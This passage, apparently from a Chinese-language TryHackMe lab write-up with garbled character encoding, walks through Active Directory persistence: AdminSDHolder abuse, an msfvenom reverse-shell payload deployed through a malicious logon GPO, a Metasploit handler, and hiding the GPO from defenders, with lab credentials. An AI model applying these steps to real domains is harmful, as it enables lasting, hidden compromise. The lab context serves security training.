ç”±äºç­‰å¾…æ—¶é—´è¿‡é•¿ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨Powershellå‘½ä»¤æ¥æ‰‹åŠ¨å¯åŠ¨è¯¥è¿›ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨C:\\Tools\\ç›®å½•ä¸‹æ‰¾åˆ°å¹¶ä½¿ç”¨è„šæœ¬Invoke-ADSDPropagationæ¥æ‰‹åŠ¨å¯åŠ¨ä¸Šè¿°æ‰€æåŠçš„SDPropè¿›ç¨‹ï¼š #ä½¿ç”¨rdpè®¿é—®åŸŸæ§åˆ¶å™¨ xfreerdp /d:za.tryhackme.loc /u:'administrator' /p:'tryhackmewouldnotguess1@' /v:THMDC.za.tryhackme.loc /cert:ignore +clipboard # Enter a PowerShell session # Now running a PowerShell session on the domain controller... #PS C:\\Tools&gt; Import-Module .\\Invoke-ADSDPropagation.ps1 #PS C:\\Tools&gt; Invoke-ADSDPropagation cd C:\\Tools dir Import-Module C:\\Tools\\Invoke-ADSDPropagation.ps1 Invoke-ADSDPropagation #ä¸é€šè¿‡RDPçš„æ–¹æ³•ï¼Œå³ä½¿ç”¨ä¸Šè¿°runasæ³¨å…¥å‘½ä»¤æ‰€å¯åŠ¨çš„cmd.exe #powershell -ep bypass # WinRM to the domain controller as the DA #Enter-PSSession -ComputerName thmdc.za.tryhackme.loc # Now running a PowerShell session on the domain controller... #Import-Module C:\\Tools\\Invoke-ADSDPropagation.ps1 #Invoke-ADSDPropagation å®Œæˆä¸Šè¿°æ“ä½œåï¼Œå¤§æ¦‚ç­‰å¾…ä¸€åˆ†é’Ÿå·¦å³ï¼Œç„¶åç»§ç»­ä½¿ç”¨ä¸Šæ–‡ä¸­çš„MMCæ§åˆ¶å°æ£€æŸ¥å—ä¿æŠ¤ç»„(å¦‚Domain Adminsç»„)çš„å®‰å…¨æƒé™ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„ä½æƒé™ADç”¨æˆ·å¯¹äºDomain Adminsç»„å…·æœ‰å®Œå…¨æ§åˆ¶æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ä»DAç»„çš„å®‰å…¨æƒé™å±æ€§ä¸­åˆ é™¤ä½æƒé™ADç”¨æˆ·å¹¶é‡æ–°è¿è¡ŒPowerShellè„šæœ¬æ¥éªŒè¯æˆ‘ä»¬ä¹‹å‰æ‰€ä¿®æ”¹çš„æ¨¡ç‰ˆç»„çš„ACLå°†ç»§ç»­ä¼ æ’­ï¼Œè€Œä¸”æˆ‘ä»¬çš„ä½æƒé™ç”¨æˆ·å°†ä¼šè¢«å†æ¬¡æ·»åŠ åˆ°Domain Adminsç»„çš„ACLä¸­ã€‚æœ‰è¶£çš„æ˜¯ï¼Œè™½ç„¶æˆ‘ä»¬æœ‰æƒé™ä¿®æ”¹DAç»„ï¼Œä½†æ˜¯å®ƒå¹¶ä¸ä¼šè‡ªåŠ¨å°†æˆ‘ä»¬çš„ä½æƒé™ADç”¨æˆ·(ä¾‹å¦‚grace.clarake)æ·»åŠ åˆ°ç»„æˆå‘˜åˆ—è¡¨ä¸­ï¼š æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬æ‰€è¢«åˆ†é…çš„æ–°æƒé™ï¼Œå°†å¯¹åº”çš„ä½æƒé™ADç”¨æˆ·(ä¾‹å¦‚grace.clarke)ä½œä¸ºç»„æˆå‘˜æ·»åŠ åˆ°DAç»„ä¸­ï¼š ç„¶åéªŒè¯ä½æƒé™ç”¨æˆ·çš„å¯ç”¨ç‰¹æƒï¼šï¼ˆè¿™é‡Œä¸çŸ¥é“ä¸ºä½•éªŒè¯ä¸æˆåŠŸï¼‰ æˆåŠŸå®ä¾‹ï¼š æˆ‘çš„ç¤ºä¾‹ï¼š tipsï¼šåœ¨æ‰‹åŠ¨å¯åŠ¨SDPropè¿›ç¨‹ä¹‹åï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¹‹å‰çš„RDPç•Œé¢(ç”¨äºä½æƒé™ADç”¨æˆ·è®¿é—®è·³æ¿ä¸»æœºçš„RDPï¼Œè§ä¸Šæ–‡)æ‰§è¡ŒPowerShellå‘½ä»¤æ¥å‘å—ä¿æŠ¤ç»„(ä¾‹å¦‚DAç»„)æ‰‹åŠ¨æ·»åŠ ç»„æˆå‘˜ã€‚ Add-ADGroupMember -Identity 'Domain Admins' -Members 'grace.clarke' Get-ADGroupMember -Identity 'Domain Admins' | Where-Object {$_.SamAccountName -eq 'grace.clarke'} dir \\\\thmdc.za.tryhackme.loc\\C$\\Users ä¸Šè¿°çš„æ–¹æ³•æˆ‘ä¾æ—§ä¸æˆåŠŸã€‚ã€‚ã€‚ è“é˜Ÿæ­£åœ¨èµ°ä¸‹å¡è·¯ æˆ‘ä»¬å¯ä»¥å°†æœ¬å°èŠ‚çš„æƒé™ç»´æŒæŠ€æœ¯ä¸ä¸Šä¸€å°èŠ‚ä¸­çš„ç»„åµŒå¥—æŠ€æœ¯ç»“åˆèµ·æ¥ã€‚å³ä½¿è“é˜Ÿé€šè¿‡æ›´æ”¹å¤§é‡çš„ç»„æ’¤é”€äº†æˆ‘ä»¬æ‰€è·å¾—çš„è®¿é—®æƒé™ï¼Œä½†æ˜¯åœ¨60åˆ†é’Ÿåï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é‡æ–°è¢«è‡ªåŠ¨åˆ†é…æƒé™ã€‚é™¤éè“é˜ŸçŸ¥é“æˆ‘ä»¬æ‰€è·å¾—çš„æƒé™æ˜¯é€šè¿‡ä¿®æ”¹AdminSDHolderç»„è€Œæ¥çš„ï¼Œå¦åˆ™è“é˜Ÿæ¯éš”60åˆ†é’Ÿå°±ä¼šæ„Ÿåˆ°å¤´ç–¼ã€‚ ç”±äºè¿™ç§æƒé™ç»´æŒæ˜¯é€šè¿‡åˆæ³•çš„ADæœåŠ¡æ¥ä¼ æ’­å®ç°çš„ï¼Œå› æ­¤æ¯æ¬¡å‘ç”Ÿä¸Šè¿°è‡ªåŠ¨åˆ†é…æƒé™çš„æƒ…å†µæ—¶ï¼Œè“é˜Ÿéƒ½éš¾ä»¥æ‰¾åˆ°çœŸæ­£çš„é—®é¢˜æ‰€åœ¨ã€‚æˆ‘ä»¬è¿˜å¯ä»¥å°†å®Œå…¨æ§åˆ¶æƒé™æˆäºˆAdminSDHolderæ¨¡ç‰ˆç»„ä¸­çš„Domain Users(åŸŸç”¨æˆ·)ç»„ï¼Œè¿™æ„å‘³ç€ä»»ä½•ä½æƒé™ADç”¨æˆ·éƒ½å°†è¢«æˆäºˆå¯¹äºæ‰€æœ‰çš„å—ä¿æŠ¤ç»„çš„å®Œå…¨æ§åˆ¶æƒé™ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†æ­¤é¡¹æŠ€æœ¯ä¸å®Œæ•´çš„DCåŒæ­¥æ”»å‡»ç›¸ç»“åˆï¼Œè¿™æ„å‘³ç€è“é˜Ÿè¿˜éœ€è¦é‡ç½®ç›®æ ‡ADåŸŸä¸­çš„æ¯ä¸ªå‡­æ®ä»¥å°è¯•å½»åº•æ¸…é™¤æˆ‘ä»¬æ‰€è·å¾—çš„æƒé™ã€‚ 0x08 é€šè¿‡GPOå®ç°æŒä¹…åŒ– GPOï¼Œå³ç»„ç­–ç•¥å¯¹è±¡ï¼Œå®ƒå¯ä»¥è¢«ç”¨äºå¸®åŠ©æˆ‘ä»¬æ‰§è¡ŒADæšä¸¾ã€ADæ”»å‡»æˆ–è€…ADåˆ©ç”¨ç­‰æŠ€æœ¯ï¼ŒåŒæ—¶ï¼Œå®ƒä¹Ÿå¯ä»¥è¢«ç”¨äºå®ç°åŸŸæƒé™ç»´æŒã€‚ ADåŸŸä¸­çš„ç»„ç­–ç•¥ç®¡ç†(GPM)èƒ½å¤Ÿæä¾›ä¸€ç§é›†ä¸­çš„æœºåˆ¶æ¥ç®¡ç†æ‰€æœ‰åŸŸå†…æœºå™¨çš„æœ¬åœ°ç­–ç•¥é…ç½®ï¼ŒåŒ…æ‹¬å¯¹å—é™åˆ¶ç»„çš„æˆå‘˜å…³ç³»ã€é˜²ç«å¢™ç¨‹åºã€åç—…æ¯’ç¨‹åºç­‰åŠŸèƒ½çš„é…ç½®ï¼Œä»¥åŠé…ç½®ä¸»æœºå¯åŠ¨æ—¶åº”è¯¥æ‰§è¡Œå“ªäº›è„šæœ¬ã€‚è™½ç„¶GPMæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ç®¡ç†å·¥å…·ï¼Œä½†æ˜¯æ”»å‡»è€…ä¹Ÿå¯èƒ½ä¼šé’ˆå¯¹GPMä»¥ä¾¿åœ¨ç›®æ ‡ADåŸŸä¸­å®ç°æƒé™ç»´æŒï¼Œæ›´ç³Ÿç³•çš„æ˜¯ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥éšè—æ¶æ„çš„GPOï¼Œä»¥è‡³äºè“é˜Ÿéš¾ä»¥å°†æ¶æ„çš„GPOåˆ é™¤ã€‚ ä»‹ç» ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„åŸºäºGPOçš„æƒé™ç»´æŒæŠ€æœ¯ï¼š é…ç½®å—é™åˆ¶ç»„çš„æˆå‘˜å…³ç³»ï¼šè¿™å°†å…è®¸æˆ‘ä»¬ä»¥ç®¡ç†å¹¶è®¿é—®åŸŸå†…çš„æ‰€æœ‰ä¸»æœºã€‚ éƒ¨ç½²ç™»å½•è„šæœ¬ï¼šè¿™å°†ç¡®ä¿æ¯æ¬¡ADç”¨æˆ·å¯¹åŸŸä¸­çš„ä¸»æœºè¿›è¡Œèº«ä»½éªŒè¯æ—¶(å¦‚ADç”¨æˆ·çš„ç™»å½•æ“ä½œ)ï¼Œæˆ‘ä»¬éƒ½ä¼šå¾—åˆ°ä¸€ä¸ªshellå›è°ƒã€‚ æˆ‘ä»¬åœ¨æœ¬å°èŠ‚ä¸­ä¼šé‡ç‚¹å…³æ³¨ä¸Šè¿°ç¬¬äºŒç§æƒé™ç»´æŒæŠ€æœ¯ï¼Œè™½ç„¶èƒ½å¤Ÿè®¿é—®æ‰€æœ‰åŸŸå†…ä¸»æœºæ˜¯ä»¶å¥½äº‹ï¼Œä½†æ˜¯å¦‚æœèƒ½å¤Ÿç¡®ä¿æˆ‘ä»¬ä»¥ç®¡ç†å‘˜æƒé™æ¥è®¿é—®è¿™äº›ä¸»æœºï¼Œé‚£å°±æ›´å¥½äº†ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªé“¾æ¥åˆ°Admins OU(ç»„ç»‡å•å…ƒ)çš„GPOï¼Œè¿™å°†å…è®¸æˆ‘ä»¬åœ¨ADç”¨æˆ·æ¯æ¬¡å¯¹åŸŸå†…ä¸»æœºè¿›è¡Œèº«ä»½éªŒè¯æ—¶èƒ½å¤Ÿè·å¾—ç›¸å…³çš„shellã€‚ å‰æœŸå‡†å¤‡å·¥ä½œ åœ¨æˆ‘ä»¬åˆ›å»ºGPOä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ç”Ÿæˆshellæ–‡ä»¶ã€è®¾ç½®ç«¯å£ä¾¦å¬å™¨ä»¥åŠç¼–å†™èƒ½å¤Ÿæ‰§è¡Œshellçš„batæ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥ç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œçš„shellæ–‡ä»¶ï¼š msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=5555 -f exe &gt; hybcx_shell.exe æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªæ‰¹å¤„ç†è„šæœ¬ï¼Œæ­¤è„šæœ¬ä¼šåœ¨ADç”¨æˆ·ç™»å½•ä¸»æœºæ—¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œï¼Œè¯¥è„šæœ¬å°†æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š å°†æœ‰æ•ˆè½½è·æ–‡ä»¶(å³ä¸Šé¢æ‰€ç”Ÿæˆçš„shellæ–‡ä»¶)ä»åŸŸæ§åˆ¶å™¨(DC)ä¸Šçš„SYSVOLç›®å½•å¤åˆ¶åˆ°ADç”¨æˆ·çš„è®¡ç®—æœºä¸Šçš„ä¸´æ—¶ç›®å½•ä¸‹ï¼› ç­‰å¾…20ç§’å¹¶å®Œæˆshellæ–‡ä»¶çš„å¤åˆ¶ï¼› æ‰§è¡Œæœ‰æ•ˆè½½è·æ–‡ä»¶ï¼Œç”Ÿæˆåå‘shellã€‚ batè„šæœ¬(my_script.bat)çš„å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š #åœ¨æ”»å‡»æœºä¸Šåˆ›å»ºä¸€ä¸ªbatè„šæœ¬(nano my_script.bat)ï¼Œå†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š copy \\\\za.tryhackme.loc\\sysvol\\za.tryhackme.loc\\scripts\\hybcx_shell.exe C:\\tmp\\hybcx_shell.exe &amp;&amp; timeout /t 20 &amp;&amp; C:\\tmp\\hybcx_shell.exe tipsï¼šWindowså…è®¸æˆ‘ä»¬é€šè¿‡ç™»å½•GPOæ‰§è¡ŒBatch(æ‰¹å¤„ç†)æˆ–PowerShellè„šæœ¬ï¼Œä½†æ˜¯æ‰¹å¤„ç†è„šæœ¬é€šå¸¸æ¯”PowerShellè„šæœ¬æ›´ç¨³å®šã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨scpå‘½ä»¤ä»¥åŠä¸Šæ–‡æ‰€æä¾›çš„Administratorç”¨æˆ·å‡­æ®ï¼Œå°†ä¸Šè¿°ä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡DCçš„SYSVOLç›®å½•ä¸­ï¼š #åœ¨æ”»å‡»æœºä¸Šæ“ä½œ root:~$ scp hybcx_shell.exe za\\\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/ root:~$ scp hybcx_script.bat za\\\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/ #ç”¨æˆ·åï¼šadministrator #å¯†ç ï¼štryhackmewouldnotguess1@ æœ€åï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨æ”»å‡»æœºä¸Šè®¾ç½®MSFç«¯å£ä¾¦å¬å™¨ï¼š root:~$ msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.58.47; set LPORT 5555;exploit\" [*] Using configured payload generic/shell_reverse_tcp payload =&gt; windows/x64/meterpreter/reverse_tcp LHOST =&gt; persistad LPORT =&gt; 4445 [*] Started reverse TCP handler on 10.50.84.147:4445 åˆ›å»ºGPO ç°åœ¨ï¼Œæˆ‘ä»¬çš„å‡†å¤‡å·¥ä½œå·²ç»å®Œæˆï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åˆ›å»ºGPOï¼Œæˆ‘ä»¬å°†é€šè¿‡RDPè¿æ¥åˆ°è·³æ¿ä¸»æœºTHMWRK1ï¼Œå¹¶ä½¿ç”¨runaså‘½ä»¤æ³¨å…¥ç®¡ç†å‘˜å‡­æ®ä»¥å¯åŠ¨MMCæ§åˆ¶å°ã€‚è¿™éƒ¨åˆ†å†…å®¹å¯ä»¥å‚è€ƒä¸Šä¸€å°èŠ‚çš„æ“ä½œæ­¥éª¤ï¼š #åœ¨æ”»å‡»æœºä¸Šå¦å¯ä¸€ä¸ªç»ˆç«¯ xfreerdp /d:za.tryhackme.loc /u:'chloe.potter' /p:'Marisa2014' /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard runas /netonly /user:thmchilddc.tryhackme.loc\\Administrator cmd.exe #ç”¨æˆ·åï¼šadministrator #å¯†ç ï¼štryhackmewouldnotguess1@ mmc.exe åœ¨MMCæ§åˆ¶å°ä¸­é€‰æ‹©File &gt; Add/Remove Snap-insï¼Œå¹¶æ·»åŠ Group Policy Management(ç»„ç­–ç•¥ç®¡ç†)å•å…ƒï¼š è¿™é‡Œæˆ‘ç‚¹å‡»OKä¹‹åæ€»æ˜¯æŠ¥é”™ï¼Œè¯´æ˜¯ä¸èƒ½è”ç³»ä¸Šå¯¹åº”çš„DCæ§åˆ¶å™¨ï¼Œè¿™é‡Œæ²¡åŠæ³•ï¼Œæˆ‘å°±ç›´æ¥ç…§æ¬çœ‹æ€è·¯äº† åœ¨æœ¬å°èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ç¼–å†™ä¸€ä¸ªä¼šè¢«åº”ç”¨åˆ°æ‰€æœ‰ç®¡ç†å‘˜çš„GPOï¼Œæˆ‘ä»¬å…ˆå³é”®ç‚¹å‡»GPMä¸­çš„Admins OUï¼Œç„¶åé€‰æ‹©åœ¨å½“å‰åŸŸä¸­åˆ›å»ºGPOä»¥å®Œæˆé“¾æ¥ã€‚æˆ‘ä»¬å¯ä»¥æŒ‡å®šä¸€ä¸ªåç§°ç»™æˆ‘ä»¬æ‰€åˆ›å»ºçš„GPOï¼Œå¦‚username - persisting GPOï¼š tipsï¼šä»æŠ€æœ¯ä¸Šè®²ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ¶æ„å†…å®¹å†™å…¥ä¸Šå›¾ä¸­çš„é»˜è®¤åŸŸç­–ç•¥(Default Domain Policy)ï¼Œè¯¥ç­–ç•¥èƒ½å¤Ÿè¢«ä¼ æ’­ç»™æ‰€æœ‰çš„ADå¯¹è±¡ã€‚ å³é”®å•å‡»æˆ‘ä»¬æ‰€åˆ›å»ºçš„GPOå¹¶é€‰æ‹©Enforced(å¼ºåˆ¶æ‰§è¡Œ)ï¼Œè¿™å°†ç¡®ä¿æˆ‘ä»¬çš„ç­–ç•¥è¢«åº”ç”¨(å³ä½¿å­˜åœ¨ç­–ç•¥å†²çªï¼Œè¿™ä¹Ÿèƒ½è®©æˆ‘ä»¬çš„ç­–ç•¥æ›´åŠ ä¼˜å…ˆ)ï¼š å³é”®å•å‡»ä¸Šè¿°æ¶æ„ç­–ç•¥å¹¶é€‰æ‹©ç¼–è¾‘ï¼š åœ¨ç”¨æˆ·é…ç½®(User Configuration)ä¸‹å±•å¼€Policies-&gt;Windows Settingsï¼› é€‰æ‹©Scripts (Logon/Logoff)ï¼› å³é”®å•å‡»Logon-&gt;Propertiesï¼› é€‰æ‹©Scriptsé€‰é¡¹å¡ï¼› å•å‡»Add-&gt;Browseã€‚ å¯¼èˆªåˆ°æˆ‘ä»¬å­˜å‚¨shellæ–‡ä»¶ä»¥åŠæ‰¹å¤„ç†æ–‡ä»¶çš„ç›®å½•ï¼š æˆ‘ä»¬é€‰æ‹©æ‰¹å¤„ç†æ–‡ä»¶ä½œä¸ºè„šæœ¬ï¼Œå¹¶ç‚¹å‡»â€œæ‰“å¼€â€å’Œâ€œç¡®è®¤â€é€‰é¡¹ï¼Œç„¶åç»§ç»­ç‚¹å‡»â€œåº”ç”¨â€å’Œâ€œç¡®è®¤â€ã€‚è¿™å°†ç¡®ä¿æ¯æ¬¡ç®¡ç†å‘˜ç»„(tier 2, 1, and 0)ä¸­çš„æˆå‘˜ç™»å½•åˆ°ä»»ä½•è®¡ç®—æœºæ—¶ï¼Œæˆ‘ä»¬éƒ½ä¼šåœ¨æ”»å‡»æœºä¸Šæ”¶åˆ°ä¸€ä¸ªåå‘shellå›è°ƒã€‚ æˆ‘ä»¬å°†é€šè¿‡æ¨¡æ‹Ÿç®¡ç†å‘˜ç”¨æˆ·ç™»å½•æ¥å®Œæˆåˆšæ‰æ‰€æåŠçš„shellå›è°ƒè¿‡ç¨‹ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†é‡ç½®å±äºç®¡ç†å‘˜ç»„çš„æŸä¸ªç”¨æˆ·çš„å¯†ç ä»¥ä¾¿æˆ‘ä»¬ä½¿ç”¨å¯†ç æ¨¡æ‹Ÿç™»å½•ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦ä½¿ç”¨ä¸Šè¿°çš„MMCæ§åˆ¶å°ï¼Œä½†æ˜¯è¿™æ¬¡æˆ‘ä»¬å°†æ·»åŠ Active Directory Users and Computersç®¡ç†å•å…ƒã€‚ é€‰æ‹©ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·å¹¶å³é”®å•å‡»ï¼Œç„¶åé€‰æ‹©â€œé‡ç½®å¯†ç â€¦â€ï¼š æ³¨æ„ï¼šæˆ‘ä»¬éœ€è¦ä¸ºä¸Šè¿°æ¶æ„GPOåˆ›å»ºä¸€ä¸ªLogon(ç™»å½•)äº‹ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ç¡®ä¿æ³¨é”€æˆ‘ä»¬ä¸Šæ–‡ä¸­ç”¨äºåˆ›å»ºæ¶æ„GPOçš„RDPä¼šè¯ï¼Œæ³¨é”€è¿‡ç¨‹å°†å¦‚ä¸‹æ‰€ç¤ºã€‚ ç°åœ¨ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨å·²ç»ä¿®æ”¹äº†å¯†ç çš„ç®¡ç†å‘˜ç”¨æˆ·èº«ä»½é€šè¿‡RDPè®¿é—®thmserver1ç›®æ ‡æœºå™¨ï¼Œè¿™å°†è§¦å‘ç™»å½•äº‹ä»¶ï¼š xfreerdp /v:thmserver1.za.tryhackme.loc /u:'t1_eileen.burton' /p:'Strong.Password123' /cert:ignore +clipboard #ä½¿ç”¨æˆ‘ä»¬æ‰€è®¾ç½®çš„æ–°å¯†ç è¿›è¡Œç™»å½• ç„¶åæˆ‘ä»¬å°†åœ¨æ”»å‡»æœºä¸Šçš„ç«¯å£ç›‘å¬å™¨ä¸Šæ¥æ”¶åˆ°ä¸€ä¸ªåå‘shellè¿æ¥ï¼š msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.50.84.147:4445 [*] Sending stage (176195 bytes) to 172.31.1.201 [*] Meterpreter session 1 opened (10.50.84.147:4445 -&gt; 172.31.1.201:63695) at 202x-05-07 10:06:28 +0100 meterpreter &gt; éšè—GPO æˆ‘ä»¬ä¸å¸Œæœ›è“é˜Ÿèƒ½å¤Ÿä¿®æ”¹æˆ–åˆ é™¤æˆ‘ä»¬æ‰€åˆ›å»ºçš„æ¶æ„GPOï¼Œè¿™ä¼šç ´åæˆ‘ä»¬æ‰€å»ºç«‹çš„æŒä¹…æ€§æƒé™ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨thmwrk1è·³æ¿ä¸»æœºä¸Šæ‰“å¼€MMCæ§åˆ¶å°ï¼Œå¹¶å°è¯•éšè—æˆ‘ä»¬åˆšæ‰æ‰€åˆ›å»ºçš„GPOã€‚ xfreerdp /d:za.tryhackme.loc /u:'chloe.potter' /p:'Marisa2014' /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard runas /netonly /user:thmchilddc.tryhackme.loc\\Administrator cmd.exe mmc.exe å•å‡»â€œå§”æ´¾â€é€‰é¡¹å¡ï¼š åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰ç®¡ç†å‘˜éƒ½å¯ä»¥ç¼–è¾‘æˆ‘ä»¬ä¸Šæ–‡æ‰€åˆ›å»ºçš„GPOï¼Œæ‰€ä»¥è®©æˆ‘ä»¬åˆ é™¤è¿™äº›æƒé™ï¼š å³é”®å•å‡»ENTERPRISE DOMAIN CONTROLLERS (ä¼ä¸šåŸŸæ§åˆ¶å™¨)ï¼Œç„¶åé€‰æ‹©Edit settings, delete, modify securityï¼› å•å‡»æ‰€æœ‰å…¶ä»–ç»„(ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·é™¤å¤–)ï¼Œç„¶åå•å‡»åˆ é™¤ã€‚ æœ€åçš„å§”æ´¾å†…å®¹å°†å¦‚ä¸‹æ‰€ç¤ºï¼š å•å‡»æ¶æ„GPOçš„å®‰å…¨è®¾ç½®ä¸­çš„é«˜çº§é€‰é¡¹å¹¶ä»æƒé™ä¸­åˆ é™¤Created Ownerï¼š tipsï¼šåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰é€šè¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·éƒ½å¿…é¡»å…·æœ‰è¯»å–ç­–ç•¥çš„æƒé™ï¼Œå¦åˆ™ï¼Œå½“ADç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ä»¥åº”ç”¨ç”¨æˆ·ç­–ç•¥æ—¶ï¼Œå°†æ— æ³•è¯»å–ç­–ç•¥ã€‚å¦‚æœæˆ‘ä»¬æ²¡æœ‰éƒ¨ç½²ç™»å½•è„šæœ¬ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•åˆ é™¤æ­¤æƒé™ï¼Œä»¥ç¡®ä¿å‡ ä¹æ²¡æœ‰äººèƒ½å¤Ÿè¯»å–æˆ‘ä»¬çš„ç­–ç•¥ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†Authenticated Usersæ›¿æ¢æˆDomain Computersï¼Œä»¥ç¡®ä¿è®¡ç®—æœºå¯ä»¥è¯»å–å’Œåº”ç”¨æˆ‘ä»¬çš„æ¶æ„ç­–ç•¥ï¼Œä½†æ˜¯åŒæ—¶æˆ‘ä»¬è¿˜è¦é˜»æ­¢ä»»ä½•ADç”¨æˆ·å»è¯»å–æ¶æ„ç­–ç•¥(æˆ‘ä»¬éœ€è¦æå‰æµ‹è¯•ä¸€ä¸‹åå‘shellå›è°ƒèƒ½å¤Ÿæ­£å¸¸è¿›è¡Œï¼Œå› ä¸ºæˆ‘ä»¬æ¥ä¸‹æ¥çš„æ“ä½œä¼šä½¿å¾—ç”¨æˆ·æ— æ³•è¯»å–PowerShellè„šæœ¬)ï¼š åœ¨æ¶æ„GPOçš„å®‰å…¨è®¾ç½®ä¸­å•å‡»æ·»åŠ ï¼› è¾“å…¥Domain Computersï¼Œç„¶åç‚¹å‡»Check Nameså¹¶ç»§ç»­ç‚¹å‡»OKï¼› é€‰æ‹©Read permissionså¹¶ç¡®è®¤ï¼› ç‚¹å‡»é€‰ä¸­Authenticated Userså¹¶è¿›è¡Œåˆ é™¤ã€‚ æ‰§è¡Œä¸Šæ¬¡æ­¥éª¤ä¹‹åï¼Œæˆ‘ä»¬å°†ç«‹å³æ”¶åˆ°ä¸€ä¸ªé”™è¯¯æç¤ºï¼Œå‘Šè¯‰æˆ‘ä»¬æ— æ³•å†è¯»å–ç­–ç•¥ï¼š é€šè¿‡æ‰§è¡Œä¸Šè¿°æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿è“é˜Ÿæ— æ³•è½»æ˜“åˆ é™¤æˆ‘ä»¬æ‰€åˆ›å»ºçš„æ¶æ„GPOï¼Œé™¤éä»–ä»¬é€‰æ‹©æ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·ã€‚ 0x09 æ€»ç»“ æˆ‘ä»¬å¯ä»¥é€šè¿‡å‡ ç§ä¸åŒçš„æ–¹å¼æ¥å®ç°åŸŸæƒé™ç»´æŒï¼Œå…¶ä¸­çš„ä¸€äº›æŠ€æœ¯ä¼šæ¯”å…¶ä»–æŠ€æœ¯æ›´åŠ å…·æœ‰éšè”½æ€§å’Œæœ‰æ•ˆæ€§ã€‚ä¸ºäº†ç¡®ä¿æˆ‘ä»¬æ‰€æ‰§è¡Œçš„æƒé™ç»´æŒè®¾ç½®ä¸ä¼šè¢«è“é˜Ÿç§»é™¤ï¼Œæˆ‘ä»¬å¿…é¡»åˆ›é€ æ€§åœ°æ€è€ƒæ€ä¹ˆè¿›è¡Œæƒé™ç»´æŒã€‚ æ­¤å¤–ï¼Œæˆ‘ä»¬ä¸åº”è¯¥ç­‰åˆ°æ•´ä¸ªç›®æ ‡ADåŸŸéƒ½è¢«æ¸—é€ä¹‹åå†è€ƒè™‘è¿›è¡Œæƒé™ç»´æŒï¼Œå®é™…ä¸Šï¼Œåœ¨æ¯ä¸€è½®çš„æ¨ªå‘ç§»åŠ¨å’Œæƒé™æå‡æ“ä½œä¹‹åï¼Œæˆ‘ä»¬å°±åº”è¯¥å°è¯•è¿›è¡ŒåŸŸæƒé™ç»´æŒã€‚ å…¶ä»–åŸŸæƒé™ç»´æŒæŠ€æœ¯ åœ¨æœ¬æ–‡çš„å®éªŒç½‘ç»œç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ä»‹ç»äº†å‡ ç§å¯ç”¨äºåœ¨ADåŸŸä¸­å®ç°æƒé™ç»´æŒçš„æŠ€æœ¯ï¼›ä½†æ˜¯ï¼Œæˆ‘ä»¬ç›®å‰æ‰€ä»‹ç»çš„æƒé™ç»´æŒæŠ€æœ¯ç»ä¸æ˜¯ä¸€ä¸ªè¯¦å°½çš„æ¸…å•ã€‚ä¸‹é¢æ˜¯å…¶ä»–ä¸€äº›å€¼å¾—è¢«æåŠçš„åŸŸæƒé™ç»´æŒæŠ€æœ¯ï¼š Skeleton keysï¼šä½¿ç”¨Mimikatzï¼Œæˆ‘ä»¬å¯ä»¥éƒ¨ç½²ä¸‡èƒ½é’¥åŒ™(skeleton 